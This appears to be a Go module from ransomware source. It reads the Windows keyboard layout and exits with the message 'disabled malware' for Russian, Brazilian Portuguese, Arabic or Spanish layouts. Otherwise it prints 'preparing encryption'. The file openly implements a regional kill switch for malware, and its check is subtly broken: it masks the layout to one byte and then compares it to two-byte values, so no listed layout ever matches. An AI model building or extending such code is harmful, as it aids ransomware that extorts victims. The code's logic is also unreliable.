package layout

import (
	"fmt"
	"os"

	"golang.org/x/sys/windows"
)

var (
	user32                = windows.NewLazySystemDLL("user32.dll")
	procGetKeyboardLayout = user32.NewProc("GetKeyboardLayout")
)

func GetKeyboardLayout() uintptr {
	layout, _, _ := procGetKeyboardLayout.Call(0)
	return layout
}

var Layout = map[uintptr]string{
	0x0419: "Russia",
	0x0416: "Portuguese Brazil",
	0x0401: "Arabic",
	0x0C0A: "Spanish",
}

func LayoutExist() {
	layout := GetKeyboardLayout() & 0xFF
	if name, exists := Layout[layout]; exists {
		fmt.Printf("Detected %s (Layout: 0x%X), disabled malware", name, layout)
		os.Exit(0)
	} else {
		fmt.Println("Language detected, preparing encryption")
	}
}
